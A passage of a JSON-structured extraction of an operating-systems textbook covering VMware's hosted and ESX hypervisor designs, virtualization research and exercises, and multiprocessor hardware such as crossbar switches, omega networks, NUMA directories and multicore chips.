world-switch code returns control to the VMware driver, which in (iii) emulates\r\nthe same interrupt that was issued by the disk. So in step (iv), the interrupt handler\r\nof the host operating system runs through its logic, as if the disk interrupt had oc\u0002curred while the VMware driver (but not the VMM!) was running. Finally, in step\r\n(v), the VMware driver returns control to the VMX application. At this point, the\r\nhost operating system may choose to schedule another process, or keep running the\r\nVMware VMX process. If the VMX process keeps running, it will then resume ex\u0002ecution of the virtual machine by doing a special call into the device driver, which\r\nwill generate a world switch back into the VMM context. As you see, this is a neat\r\ntrick that hides the entire VMM and virtual machine from the host operating sys\u0002tem. More importantly, it provides the VMM complete freedom to reprogram the\r\nhardware as it sees fit."
          },
          "7.12.5 The Evolution of VMware Workstation": {
            "page": 542,
            "content": "7.12.5 The Evolution of VMware Workstation\r\nThe technology landscape has changed dramatically in the decade following\r\nthe development of the original VMware Virtual Machine Monitor.\r\nThe hosted architecture is still used today for state-of-the-art interactive hyper\u0002visors such as VMware Workstation, VMware Player, and VMware Fusion (the\r\nproduct aimed at Apple OS X host operating systems), and even in VMware’s\r\nproduct aimed at cell phones (Barr et al., 2010). The world switch, and its ability to\r\nseparate the host operating system context from the VMM context, remains the\r\nfoundational mechanism of VMware’s hosted products today. Although the imple\u0002mentation of the world switch has evolved through the years, for example, to\n512 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nsupport 64-bit systems, the fundamental idea of having totally separate address\r\nspaces for the host operating system and the VMM remains valid today.\r\nIn contrast, the approach to the virtualization of the x86 architecture changed\r\nrather dramatically with the introduction of hardware-assisted virtualization. Hard\u0002ware-assisted virtualizations, such as Intel VT-x and AMD-v were introduced in\r\ntwo phases. The first phase, starting in 2005, was designed with the explicit pur\u0002pose of eliminating the need for either paravirtualization or binary translation\r\n(Uhlig et al., 2005). Starting in 2007, the second phase provided hardware support\r\nin the MMU in the form of nested page tables. This eliminated the need to main\u0002tain shadow page tables in software. Today, VMware’s hypervisors mostly uses a\r\nhardware-based, trap-and-emulate approach (as formalized by Popek and Goldberg\r\nfour decades earlier) whenever the processor supports both virtualization and\r\nnested page tables.\r\nThe emergence of hardware support for virtualization had a significant impact\r\non VMware’s guest operating system centric-strategy. In the original VMware\r\nWorkstation, the strategy was used to dramatically reduce implementation com\u0002plexity at the expense of compatibility with the full architecture. Today, full archi\u0002tectural compatibility is expected because of hardware support. The current\r\nVMware guest operating system-centric strategy focuses on performance optimiza\u0002tions for selected guest operating systems."
          },
          "7.12.6 ESX Server: VMware’s type 1 Hypervisor": {
            "page": 543,
            "content": "7.12.6 ESX Server: VMware’s type 1 Hypervisor\r\nIn 2001, VMware released a different product, called ESX Server, aimed at the\r\nserver marketplace. Here, VMware’s engineers took a different approach: rather\r\nthan creating a type 2 solution running on top of a host operating system, they de\u0002cided to build a type 1 solution that would run directly on the hardware.\r\nFigure 7-12 shows the high-level architecture of ESX Server. It combines an\r\nexisting component, the VMM, with a true hypervisor running directly on the bare\r\nmetal. The VMM performs the same function as in VMware Workstation, which is\r\nto run the virtual machine in an isolated environment that is a duplicate of the x86\r\narchitecture. As a matter of fact, the VMMs used in the two products use the same\r\nsource code base, and they are largely identical. The ESX hypervisor replaces the\r\nhost operating system. But rather than implementing the full functionality expected\r\nof an operating system, its only goal is to run the various VMM instances and to\r\nefficiently manage the physical resources of the machine. ESX Server therefore\r\ncontains the usual subsystem found in an operating system, such as a CPU sched\u0002uler, a memory manager, and an I/O subsystem, with each subsystem optimized to\r\nrun virtual machines.\r\nThe absence of a host operating system required VMware to directly address\r\nthe issues of peripheral diversity and user experience described earlier. For periph\u0002eral diversity, VMware restricted ESX Server to run only on well-known and certi\u0002fied server platforms, for which it had device drivers. As for the user experience,\nSEC. 7.12 CASE STUDY: VMWARE 513\r\nx86\r\nESX hypervisor\r\nVMM VMM VMM VMM\r\nVM\r\nESX\r\nVM VM VM\r\nFigure 7-12. ESX Server: VMware’s type 1 hypervisor.\r\nESX Server (unlike VMware Workstation) required users to install a new system\r\nimage on a boot partition.\r\nDespite the drawbacks, the trade-off made sense for dedicated deployments of\r\nvirtualization in data centers, consisting of hundreds or thousands of physical ser\u0002vers, and often (many) thousands of virtual machines. Such deployments are some\u0002times referred today as private clouds. There, the ESX Server architecture provides\r\nsubstantial benefits in terms of performance, scalability, manageability, and fea\u0002tures. For example:\r\n1. The CPU scheduler ensures that each virtual machine gets a fair share\r\nof the CPU (to avoid starvation). It is also designed so that the dif\u0002ferent virtual CPUs of a given multiprocessor virtual machine are\r\nscheduled at the same time.\r\n2. The memory manager is optimized for scalability, in particular to run\r\nvirtual machines efficiently even when they need more memory than\r\nis actually available on the computer. To achieve this result, ESX Ser\u0002ver first introduced the notion of ballooning and transparent page\r\nsharing for virtual machines (Waldspurger, 2002).\r\n3. The I/O subsystem is optimized for performance. Although VMware\r\nWorkstation and ESX Server often share the same front-end emula\u0002tion components, the back ends are totally different. In the VMware\r\nWorkstation case, all I/O flows through the host operating system and\r\nits API, which often adds overhead. This is particularly true in the\r\ncase of networking and storage devices. With ESX Server, these de\u0002vice drivers run directly within the ESX hypervisor, without requiring\r\na world switch.\r\n4. The back ends also typically relied on abstractions provided by the\r\nhost operating system. For example, VMware Workstation stores vir\u0002tual machine images as regular (but very large) files on the host file\r\nsystem. In contrast, ESX Server has VMFS (Vaghani, 2010), a file\n514 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nsystem optimized specifically to store virtual machine images and\r\nensure high I/O throughput. This allows for extreme levels of per\u0002formance. For example, VMware demonstrated back in 2011 that a\r\nsingle ESX Server could issue 1 million disk operations per second\r\n(VMware, 2011).\r\n5. ESX Server made it easy to introduce new capabilities, which re\u0002quired the tight coordination and specific configuration of multiple\r\ncomponents of a computer. For example, ESX Server introduced\r\nVMotion, the first virtualization solution that could migrate a live vir\u0002tual machine from one machine running ESX Server to another ma\u0002chine running ESX Server, while it was running. This achievement re\u0002quired the coordination of the memory manager, the CPU scheduler,\r\nand the networking stack.\r\nOver the years, new features were added to ESX Server. ESX Server evolved\r\ninto ESXi, a small-footprint alternative that is sufficiently small in size to be\r\npre-installed in the firmware of servers. Today, ESXi is VMware’s most important\r\nproduct and serves as the foundation of the vSphere suite."
          }
        }
      },
      "7.13 RESEARCH ON VIRTUALIZATION AND THE CLOUD": {
        "page": 545,
        "content": "7.13 RESEARCH ON VIRTUALIZATION AND THE CLOUD\r\nVirtualization technology and cloud computing are both extremely active re\u0002search areas. The research produced in these fields is way too much to enumerate.\r\nEach has multiple research conferences. For instance, the Virtual Execution Envi\u0002ronments (VEE) conference focuses on virtualization in the broadest sense. You\r\nwill find papers on migration deduplication, scaling out, and so on. Likewise, the\r\nACM Symposium on Cloud Computing (SOCC) is one of the best-known venues\r\non cloud computing. Papers in SOCC include work on fault resilience, scheduling\r\nof data center workloads, management and debugging in clouds, and so on.\r\nOld topics never really die, as in Penneman et al. (2013), which looks at the\r\nproblems of virtualizing the ARM in the light of the Popek and Goldberg criteria.\r\nSecurity is perpetually a hot topic (Beham et al., 2013; Mao, 2013; and Pearce et\r\nal., 2013), as is reducing energy usage (Botero and Hesselbach, 2013; and Yuan et\r\nal., 2013). With so many data centers now using virtualization technology, the net\u0002works connecting these machines are also a major subject of research (Theodorou\r\net al., 2013). Virtualization in wireless networks is also an up-and-coming subject\r\n(Wang et al., 2013a).\r\nOne interesting area which has seen a lot of interesting research is nested virtu\u0002alization (Ben-Yehuda et al., 2010; and Zhang et al., 2011). The idea is that a vir\u0002tual machine itself can be further virtualized into multiple higher-level virtual ma\u0002chines, which in turn may be virtualized and so on. One of these projects is appro\u0002priately called ‘‘Turtles,’’ because once you start, ‘‘It’s Turtles all the way down!’’\nSEC. 7.13 RESEARCH ON VIRTUALIZATION AND THE CLOUD 515\r\nOne of the nice things about virtualization hardware is that untrusted code can\r\nget direct but safe access to hardware features like page tables, and tagged TLBs.\r\nWith this in mind, the Dune project (Belay, 2012) does not aim to provide a ma\u0002chine abstraction, but rather it provides a process abstraction. The process is able\r\nto enter Dune mode, an irreversible transition that gives it access to the low-level\r\nhardware. Nevertheless, it is still a process and able to talk to and rely on the ker\u0002nel. The only difference that it uses the VMCALL instruction to make a system call.\r\nPROBLEMS\r\n1. Give a reason why a data center might be interested in virtualization.\r\n2. Give a reason why a company might be interested in running a hypervisor on a ma\u0002chine that has been in use for a while.\r\n3. Give a reason why a software developer might use virtualization on a desktop machine\r\nbeing used for development.\r\n4. Give a reason why an individual at home might be interested in virtualization.\r\n5. Why do you think virtualization took so long to become popular? After all, the key\r\npaper was written in 1974 and IBM mainframes had the necessary hardware and soft\u0002ware throughout the 1970s and beyond.\r\n6. Name two kinds of instructions that are sensitive in the Popek and Goldberg sense.\r\n7. Name three machine instructions that are not sensitive in the Popek and Goldberg\r\nsense.\r\n8. What is the difference between full virtualization and paravirtualization? Which do\r\nyou think is harder to do? Explain your answer.\r\n9. Does it make sense to paravirtualize an operating system if the source code is avail\u0002able? What if it is not?\r\n10. Consider a type 1 hypervisor that can support up to n virtual machines at the same\r\ntime. PCs can have a maximum of four disk primary partitions. Can n be larger than 4?\r\nIf so, where can the data be stored?\r\n11. Briefly explain the concept of process-level virtualization.\r\n12. Why do type 2 hypervisors exist? After all, there is nothing they can do that type 1\r\nhypervisors cannot do and the type 1 hypervisors are generally more efficient as well.\r\n13. Is virtualization of any use to type 2 hypervisors?\r\n14. Why was binary translation invented? Do you think it has much of a future? Explain\r\nyour answer.\r\n15. Explain how the x86’s four protection rings can be used to support virtualization.\r\n16. State one reason as to why a hardware-based approach using VT-enabled CPUs can\r\nperform poorly when compared to translation-based software approaches.\n516 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\n17. Give one case where a translated code can be faster than the original code, in a system\r\nusing binary translation.\r\n18. VMware does binary translation one basic block at a time, then it executes the block\r\nand starts translating the next one. Could it translate the entire program in advance and\r\nthen execute it? If so, what are the advantages and disadvantages of each technique?\r\n19. What is the difference between a pure hypervisor and a pure microkernel?\r\n20. Briefly explain why memory is so difficult to virtualize. well in practice? Explain your\r\nanswer.\r\n21. Running multiple virtual machines on a PC is known to require large amounts of mem\u0002ory. Why? Can you think of any ways to reduce the memory usage? Explain.\r\n22. Explain the concept of shadow page tables, as used in memory virtualization.\r\n23. One way to handle guest operating systems that change their page tables using ordin\u0002ary (nonprivileged) instructions is to mark the page tables as read only and take a trap\r\nwhen they are modified. How else could the shadow page tables be maintained? Dis\u0002cuss the efficiency of your approach vs. the read-only page tables.\r\n24. Why are balloon drivers used? Is this cheating?\r\n25. Descibe a situation in which balloon drivers do not work.\r\n26. Explain the concept of deduplication as used in memory virtualization.\r\n27. Computers have had DMA for doing I/O for decades. Did this cause any problems be\u0002fore there were I/O MMUs?\r\n28. Give one advantage of cloud computing over running your programs locally. Giv e one\r\ndisadvantage as well.\r\n29. Give an example of IAAS, PAAS, and SAAS.\r\n30. Why is virtual machine migration important? Under what circumstances might it be\r\nuseful?\r\n31. Migrating virtual machines may be easier than migrating processes, but migration can\r\nstill be difficult. What problems can arise when migrating a virtual machine?\r\n32. Why is migration of virtual machines from one machine to another easier than migrat\u0002ing processes from one machine to another?\r\n33. What is the difference between live migration and the other kind (dead migration?)?\r\n34. What were the three main requirements considered while designing VMware?\r\n35. Why was the enormous number of peripheral devices available a problem when\r\nVMware Workstation was first introduced?\r\n36. VMware ESXi has been made very small. Why? After all, servers at data centers\r\nusually have tens of gigabytes of RAM. What difference does a few tens of megabytes\r\nmore or less make?\r\n37. Do an Internet search to find two real-life examples of virtual appliances.\n8\r\nMULTIPLE PROCESSOR SYSTEMS\r\nSince its inception, the computer industry has been driven by an endless quest\r\nfor more and more computing power. The ENIAC could perform 300 operations\r\nper second, easily 1000 times faster than any calculator before it, yet people were\r\nnot satisfied with it. We now hav e machines millions of times faster than the\r\nENIAC and still there is a demand for yet more horsepower. Astronomers are try\u0002ing to make sense of the universe, biologists are trying to understand the implica\u0002tions of the human genome, and aeronautical engineers are interested in building\r\nsafer and more efficient aircraft, and all want more CPU cycles. However much\r\ncomputing power there is, it is never enough.\r\nIn the past, the solution was always to make the clock run faster. Unfortunate\u0002ly, we hav e begun to hit some fundamental limits on clock speed. According to\r\nEinstein’s special theory of relativity, no electrical signal can propagate faster than\r\nthe speed of light, which is about 30 cm/nsec in vacuum and about 20 cm/nsec in\r\ncopper wire or optical fiber. This means that in a computer with a 10-GHz clock,\r\nthe signals cannot travel more than 2 cm in total. For a 100-GHz computer the total\r\npath length is at most 2 mm. A 1-THz (1000-GHz) computer will have to be smal\u0002ler than 100 microns, just to let the signal get from one end to the other and back\r\nonce within a single clock cycle.\r\nMaking computers this small may be possible, but then we hit another funda\u0002mental problem: heat dissipation. The faster the computer runs, the more heat it\r\ngenerates, and the smaller the computer, the harder it is to get rid of this heat. Al\u0002ready on high-end x86 systems, the CPU cooler is bigger than the CPU itself. All\r\n517"
      }
    }
  },
  "8 MULTIPLE PROCESSOR SYSTEMS": {
    "page": 548,
    "children": {
      "8.1 MULTIPROCESSORS": {
        "page": 551,
        "children": {
          "8.1.1 Multiprocessor Hardware": {
            "page": 551,
            "content": "8.1.1 Multiprocessor Hardware\r\nAlthough all multiprocessors have the property that every CPU can address all\r\nof memory, some multiprocessors have the additional property that every memory\r\nword can be read as fast as every other memory word. These machines are called\r\nUMA (Uniform Memory Access) multiprocessors. In contrast, NUMA (Nonuni\u0002form Memory Access) multiprocessors do not have this property. Why this dif\u0002ference exists will become clear later. We will first examine UMA multiprocessors\r\nand then move on to NUMA multiprocessors.\r\nUMA Multiprocessors with Bus-Based Architectures\r\nThe simplest multiprocessors are based on a single bus, as illustrated in\r\nFig. 8-2(a). Tw o or more CPUs and one or more memory modules all use the same\r\nbus for communication. When a CPU wants to read a memory word, it first checks\r\nto see if the bus is busy. If the bus is idle, the CPU puts the address of the word it\r\nwants on the bus, asserts a few control signals, and waits until the memory puts the\r\ndesired word on the bus.\r\nIf the bus is busy when a CPU wants to read or write memory, the CPU just\r\nwaits until the bus becomes idle. Herein lies the problem with this design. With\r\ntwo or three CPUs, contention for the bus will be manageable; with 32 or 64 it will\r\nbe unbearable. The system will be totally limited by the bandwidth of the bus, and\r\nmost of the CPUs will be idle most of the time.\nSEC. 8.1 MULTIPROCESSORS 521\r\nCPU CPU M\r\nShared memory\r\nShared\r\nmemory\r\nBus\r\n(a)\r\nCPU CPU M\r\nPrivate memory\r\n(b)\r\nCPU CPU M\r\n(c)\r\nCache\r\nFigure 8-2. Three bus-based multiprocessors. (a) Without caching. (b) With\r\ncaching. (c) With caching and private memories.\r\nThe solution to this problem is to add a cache to each CPU, as depicted in\r\nFig. 8-2(b). The cache can be inside the CPU chip, next to the CPU chip, on the\r\nprocessor board, or some combination of all three. Since many reads can now be\r\nsatisfied out of the local cache, there will be much less bus traffic, and the system\r\ncan support more CPUs. In general, caching is not done on an individual word\r\nbasis but on the basis of 32- or 64-byte blocks. When a word is referenced, its en\u0002tire block, called a cache line, is fetched into the cache of the CPU touching it.\r\nEach cache block is marked as being either read only (in which case it can be\r\npresent in multiple caches at the same time) or read-write (in which case it may not\r\nbe present in any other caches). If a CPU attempts to write a word that is in one or\r\nmore remote caches, the bus hardware detects the write and puts a signal on the\r\nbus informing all other caches of the write. If other caches have a ‘‘clean’’ copy,\r\nthat is, an exact copy of what is in memory, they can just discard their copies and\r\nlet the writer fetch the cache block from memory before modifying it. If some\r\nother cache has a ‘‘dirty’’ (i.e., modified) copy, it must either write it back to mem\u0002ory before the write can proceed or transfer it directly to the writer over the bus.\r\nThis set of rules is called a cache-coherence protocol and is one of many.\r\nYet another possibility is the design of Fig. 8-2(c), in which each CPU has not\r\nonly a cache, but also a local, private memory which it accesses over a dedicated\r\n(private) bus. To use this configuration optimally, the compiler should place all the\r\nprogram text, strings, constants and other read-only data, stacks, and local vari\u0002ables in the private memories. The shared memory is then only used for writable\r\nshared variables. In most cases, this careful placement will greatly reduce bus traf\u0002fic, but it does require active cooperation from the compiler.\r\nUMA Multiprocessors Using Crossbar Switches\r\nEven with the best caching, the use of a single bus limits the size of a UMA\r\nmultiprocessor to about 16 or 32 CPUs. To go beyond that, a different kind of\r\ninterconnection network is needed. The simplest circuit for connecting n CPUs to k\n522 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nmemories is the crossbar switch, shown in Fig. 8-3. Crossbar switches have been\r\nused for decades in telephone switching exchanges to connect a group of incoming\r\nlines to a set of outgoing lines in an arbitrary way.\r\nAt each intersection of a horizontal (incoming) and vertical (outgoing) line is a\r\ncrosspoint. A crosspoint is a small electronic switch that can be electrically open\u0002ed or closed, depending on whether the horizontal and vertical lines are to be con\u0002nected or not. In Fig. 8-3(a) we see three crosspoints closed simultaneously, allow\u0002ing connections between the (CPU, memory) pairs (010, 000), (101, 101), and\r\n(110, 010) at the same time. Many other combinations are also possible. In fact,\r\nthe number of combinations is equal to the number of different ways eight rooks\r\ncan be safely placed on a chess board.\r\nMemories\r\nCPUs\r\nClosed\r\ncrosspoint\r\nswitch\r\nOpen\r\ncrosspoint\r\nswitch\r\n(a)\r\n(b)\r\n(c)\r\nCrosspoint\r\nswitch is closed\r\nCrosspoint\r\nswitch is open\r\n000\r\n001\r\n010\r\n011\r\n100\r\n101\r\n110\r\n111\r\n000001010011100101110111\r\nFigure 8-3. (a) An 8 × 8 crossbar switch. (b) An open crosspoint. (c) A closed\r\ncrosspoint.\r\nOne of the nicest properties of the crossbar switch is that it is a nonblocking\r\nnetwork, meaning that no CPU is ever denied the connection it needs because\r\nsome crosspoint or line is already occupied (assuming the memory module itself is\r\navailable). Not all interconnects have this fine property. Furthermore, no advance\r\nplanning is needed. Even if seven arbitrary connections are already set up, it is al\u0002ways possible to connect the remaining CPU to the remaining memory.\nSEC. 8.1 MULTIPROCESSORS 523\r\nContention for memory is still possible, of course, if two CPUs want to access\r\nthe same module at the same time. Nevertheless, by partitioning the memory into\r\nn units, contention is reduced by a factor of n compared to the model of Fig. 8-2.\r\nOne of the worst properties of the crossbar switch is the fact that the number of\r\ncrosspoints grows as n2. With 1000 CPUs and 1000 memory modules we need a\r\nmillion crosspoints. Such a large crossbar switch is not feasible. Nevertheless, for\r\nmedium-sized systems, a crossbar design is workable.\r\nUMA Multiprocessors Using Multistage Switching Networks\r\nA completely different multiprocessor design is based on the humble 2 × 2\r\nswitch shown in Fig. 8-4(a). This switch has two inputs and two outputs. Mes\u0002sages arriving on either input line can be switched to either output line. For our\r\npurposes, messages will contain up to four parts, as shown in Fig. 8-4(b). The\r\nModule field tells which memory to use. The Address specifies an address within a\r\nmodule. The Opcode gives the operation, such as READ or WRITE. Finally, the op\u0002tional Value field may contain an operand, such as a 32-bit word to be written on a\r\nWRITE. The switch inspects the Module field and uses it to determine if the mes\u0002sage should be sent on X or on Y.\r\nA\r\nB\r\nX\r\nY\r\n(a) (b)\r\nModule Address Opcode Value\r\nFigure 8-4. (a) A 2 × 2 switch with two input lines, A and B, and two output\r\nlines, X and Y. (b) A message format.\r\nOur 2 × 2 switches can be arranged in many ways to build larger multistage\r\nswitching networks (Adams et al., 1987; Garofalakis and Stergiou, 2013; and\r\nKumar and Reddy, 1987). One possibility is the no-frills, cattle-class omega net\u0002work, illustrated in Fig. 8-5. Here we have connected eight CPUs to eight memo\u0002ries using 12 switches. More generally, for n CPUs and n memories we would need\r\nlog2 n stages, with n/2 switches per stage, for a total of (n/2) log2 n switches,\r\nwhich is a lot better than n2 crosspoints, especially for large values of n.\r\nThe wiring pattern of the omega network is often called the perfect shuffle,\r\nsince the mixing of the signals at each stage resembles a deck of cards being cut in\r\nhalf and then mixed card-for-card. To see how the omega network works, suppose\r\nthat CPU 011 wants to read a word from memory module 110. The CPU sends a\r\nREAD message to switch 1D containing the value 110 in the Module field. The\r\nswitch takes the first (i.e., leftmost) bit of 110 and uses it for routing. A 0 routes to\r\nthe upper output and a 1 routes to the lower one. Since this bit is a 1, the message\r\nis routed via the lower output to 2D.\n524 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nCPUs\r\nb\r\nb\r\nb b\r\na\r\na a\r\na\r\n3 Stages\r\nMemories\r\n000\r\n001\r\n010\r\n011\r\n100\r\n101\r\n110\r\n111\r\n000\r\n001\r\n010\r\n011\r\n100\r\n101\r\n110\r\n111\r\n1A\r\n1B\r\n1C\r\n1D\r\n2A\r\n2B\r\n2C\r\n2D\r\n3A\r\n3B\r\n3C\r\n3D\r\nFigure 8-5. An omega switching network.\r\nAll the second-stage switches, including 2D, use the second bit for routing.\r\nThis, too, is a 1, so the message is now forwarded via the lower output to 3D. Here\r\nthe third bit is tested and found to be a 0. Consequently, the message goes out on\r\nthe upper output and arrives at memory 110, as desired. The path followed by this\r\nmessage is marked in Fig. 8-5 by the letter a.\r\nAs the message moves through the switching network, the bits at the left-hand\r\nend of the module number are no longer needed. They can be put to good use by\r\nrecording the incoming line number there, so the reply can find its way back. For\r\npath a, the incoming lines are 0 (upper input to 1D), 1 (lower input to 2D), and 1\r\n(lower input to 3D), respectively. The reply is routed back using 011, only reading\r\nit from right to left this time.\r\nAt the same time all this is going on, CPU 001 wants to write a word to memo\u0002ry module 001. An analogous process happens here, with the message routed via\r\nthe upper, upper, and lower outputs, respectively, marked by the letter b. When it\r\narrives, its Module field reads 001, representing the path it took. Since these two\r\nrequests do not use any of the same switches, lines, or memory modules, they can\r\nproceed in parallel.\r\nNow consider what would happen if CPU 000 simultaneously wanted to access\r\nmemory module 000. Its request would come into conflict with CPU 001’s request\r\nat switch 3A. One of them would then have to wait. Unlike the crossbar switch,\r\nthe omega network is a blocking network. Not every set of requests can be proc\u0002essed simultaneously. Conflicts can occur over the use of a wire or a switch, as\r\nwell as between requests to memory and replies from memory.\r\nSince it is highly desirable to spread the memory references uniformly across\r\nthe modules, one common technique is to use the low-order bits as the module\r\nnumber. Consider, for example, a byte-oriented address space for a computer that\nSEC. 8.1 MULTIPROCESSORS 525\r\nmostly accesses full 32-bit words. The 2 low-order bits will usually be 00, but the\r\nnext 3 bits will be uniformly distributed. By using these 3 bits as the module num\u0002ber, consecutively words will be in consecutive modules. A memory system in\r\nwhich consecutive words are in different modules is said to be interleaved. Inter\u0002leaved memories maximize parallelism because most memory references are to\r\nconsecutive addresses. It is also possible to design switching networks that are\r\nnonblocking and offer multiple paths from each CPU to each memory module to\r\nspread the traffic better.\r\nNUMA Multiprocessors\r\nSingle-bus UMA multiprocessors are generally limited to no more than a few\r\ndozen CPUs, and crossbar or switched multiprocessors need a lot of (expensive)\r\nhardware and are not that much bigger. To get to more than 100 CPUs, something\r\nhas to give. Usually, what gives is the idea that all memory modules have the same\r\naccess time. This concession leads to the idea of NUMA multiprocessors, as men\u0002tioned above. Like their UMA cousins, they provide a single address space across\r\nall the CPUs, but unlike the UMA machines, access to local memory modules is\r\nfaster than access to remote ones. Thus all UMA programs will run without change\r\non NUMA machines, but the performance will be worse than on a UMA machine.\r\nNUMA machines have three key characteristics that all of them possess and\r\nwhich together distinguish them from other multiprocessors:\r\n1. There is a single address space visible to all CPUs.\r\n2. Access to remote memory is via LOAD and STORE instructions.\r\n3. Access to remote memory is slower than access to local memory.\r\nWhen the access time to remote memory is not hidden (because there is no cach\u0002ing), the system is called NC-NUMA (Non Cache-coherent NUMA). When the\r\ncaches are coherent, the system is called CC-NUMA (Cache-Coherent NUMA).\r\nA popular approach for building large CC-NUMA multiprocessors is the\r\ndirectory-based multiprocessor. The idea is to maintain a database telling where\r\neach cache line is and what its status is. When a cache line is referenced, the data\u0002base is queried to find out where it is and whether it is clean or dirty. Since this\r\ndatabase is queried on every instruction that touches memory, it must be kept in ex\u0002tremely fast special-purpose hardware that can respond in a fraction of a bus cycle.\r\nTo make the idea of a directory-based multiprocessor somewhat more concrete,\r\nlet us consider as a simple (hypothetical) example, a 256-node system, each node\r\nconsisting of one CPU and 16 MB of RAM connected to the CPU via a local bus.\r\nThe total memory is 232 bytes and it is divided up into 226 cache lines of 64 bytes\r\neach. The memory is statically allocated among the nodes, with 0–16M in node 0,\r\n16M–32M in node 1, etc. The nodes are connected by an interconnection network,\n526 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nas shown in Fig. 8-6(a). Each node also holds the directory entries for the 218\r\n64-byte cache lines comprising its 224-byte memory. For the moment, we will as\u0002sume that a line can be held in at most one cache.\r\nDirectory\r\nNode 0 Node 1 Node 255\r\n(a)\r\n(b)\r\nBits 8 18 6\r\n(c)\r\nInterconnection network\r\nCPU Memory\r\nLocal bus\r\nCPU Memory\r\nLocal bus\r\nCPU Memory\r\nLocal bus\r\nNode Block Offset\r\n0\r\n1\r\n2\r\n3\r\n4\r\n0\r\n0\r\n1\r\n0\r\n0\r\n218-1\r\n82\r\n…\r\nFigure 8-6. (a) A 256-node directory-based multiprocessor. (b) Division of a\r\n32-bit memory address into fields. (c) The directory at node 36.\r\nTo see how the directory works, let us trace a LOAD instruction from CPU 20\r\nthat references a cached line. First the CPU issuing the instruction presents it to its\r\nMMU, which translates it to a physical address, say, 0x24000108. The MMU\r\nsplits this address into the three parts shown in Fig. 8-6(b). In decimal, the three\r\nparts are node 36, line 4, and offset 8. The MMU sees that the memory word refer\u0002enced is from node 36, not node 20, so it sends a request message through the\r\ninterconnection network to the line’s home node, 36, asking whether its line 4 is\r\ncached, and if so, where.\r\nWhen the request arrives at node 36 over the interconnection network, it is\r\nrouted to the directory hardware. The hardware indexes into its table of 218 entries,\r\none for each of its cache lines, and extracts entry 4. From Fig. 8-6(c) we see that\r\nthe line is not cached, so the hardware issues a fetch for line 4 from the local RAM\r\nand after it arrives sends it back to node 20. It then updates directory entry 4 to in\u0002dicate that the line is now cached at node 20.\nSEC. 8.1 MULTIPROCESSORS 527\r\nNow let us consider a second request, this time asking about node 36’s line 2.\r\nFrom Fig. 8-6(c) we see that this line is cached at node 82. At this point the hard\u0002ware could update directory entry 2 to say that the line is now at node 20 and then\r\nsend a message to node 82 instructing it to pass the line to node 20 and invalidate\r\nits cache. Note that even a so-called ‘‘shared-memory multiprocessor’’ has a lot of\r\nmessage passing going on under the hood.\r\nAs a quick aside, let us calculate how much memory is being taken up by the\r\ndirectories. Each node has 16 MB of RAM and 218 9-bit entries to keep track of\r\nthat RAM. Thus the directory overhead is about 9 × 218 bits divided by 16 MB or\r\nabout 1.76%, which is generally acceptable (although it has to be high-speed mem\u0002ory, which increases its cost, of course). Even with 32-byte cache lines the over\u0002head would only be 4%. With 128-byte cache lines, it would be under 1%.\r\nAn obvious limitation of this design is that a line can be cached at only one\r\nnode. To allow lines to be cached at multiple nodes, we would need some way of\r\nlocating all of them, for example, to invalidate or update them on a write. On many\r\nmulticore processors, a directory entry therefore consists of a bit vector with one\r\nbit per core. A ‘‘1’’ indicates that the cache line is present on the core, and a ‘‘0’’\r\nthat it is not. Moreover, each directory entry typically contains a few more bits. As\r\na result, the memory cost of the directory increases considerably.\r\nMulticore Chips\r\nAs chip manufacturing technology improves, transistors are getting smaller\r\nand smaller and it is possible to put more and more of them on a chip. This empir\u0002ical observation is often called Moore’s Law, after Intel co-founder Gordon\r\nMoore, who first noticed it. In 1974, the Intel 8080 contained a little over 2000\r\ntransistors, while Xeon Nehalem-EX CPUs have over 2 billion transistors.\r\nAn obvious question is: ‘‘What do you do with all those transistors?’’ As we\r\ndiscussed in Sec. 1.3.1, one option is to add megabytes of cache to the chip. This\r\noption is serious, and chips with 4–32 MB of on-chip cache are common. But at\r\nsome point increasing the cache size may run the hit rate up only from 99% to\r\n99.5%, which does not improve application performance much.\r\nThe other option is to put two or more complete CPUs, usually called cores,\r\non the same chip (technically, on the same die). Dual-core, quad-core, and octa\u0002core chips are already common; and you can even buy chips with hundreds of\r\ncores. No doubt more cores are on their way. Caches are still crucial and are now\r\nspread across the chip. For instance, the Intel Xeon 2651 has 12 physical hyper\u0002threaded cores, giving 24 virtual cores. Each of the 12 physical cores has 32 KB of\r\nL1 instruction cache and 32 KB of L1 data cache. Each one also has 256 KB of L2\r\ncache. Finally, the 12 cores share 30 MB of L3 cache.\r\nWhile the CPUs may or may not share caches (see, for example, Fig. 1-8), they\r\nalways share main memory, and this memory is consistent in the sense that there is\r\nalways a unique value for each memory word. Special hardware circuitry makes\n528 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nsure that if a word is present in two or more caches and one of the CPUs modifies\r\nthe word, it is automatically and atomically removed from all the caches in order to\r\nmaintain consistency. This process is known as snooping.\r\nThe result of this design is that multicore chips are just very small multiproces\u0002sors. In fact, multicore chips are sometimes called CMPs (Chip MultiProces\u0002sors). From a software perspective, CMPs are not really that different from bus\u0002based multiprocessors or multiprocessors that use switching networks. However,\r\nthere are some differences. To start with, on a bus-based multiprocessor, each of\r\nthe CPUs has its own cache, as in Fig. 8-2(b) and also as in the AMD design of\r\nFig. 1-8(b). The shared-cache design of Fig. 1-8(a), which Intel uses in many of its\r\nprocessors, does not occur in other multiprocessors. A shared L2 or L3 cache can\r\naffect performance. If one core needs a lot of cache memory and the others do not,\r\nthis design allows the cache hog to take whatever it needs. On the other hand, the\r\nshared cache also makes it possible for a greedy core to hurt the other cores.\r\nAn area in which CMPs differ from their larger cousins is fault tolerance. Be\u0002cause the CPUs are so closely connected, failures in shared components may bring\r\ndown multiple CPUs at once, something unlikely in traditional multiprocessors.\r\nIn addition to symmetric multicore chips, where all the cores are identical, an\u0002other common category of multicore chip is the System On a Chip (SoC). These\r\nchips have one or more main CPUs, but also special-purpose cores, such as video\r\nand audio decoders, cryptoprocessors, network interfaces, and more, leading to a\r\ncomplete computer system on a chip.\r\nManycore Chips\r\nMulticore simply means ‘‘more than one core,’’ but when the number of cores\r\ngrows well beyond the reach of finger counting, we use another name. Manycore\r\nchips are multicores that contain tens, hundreds, or even thousands of cores. While\r\nthere is no hard threshold beyond which a multicore becomes a 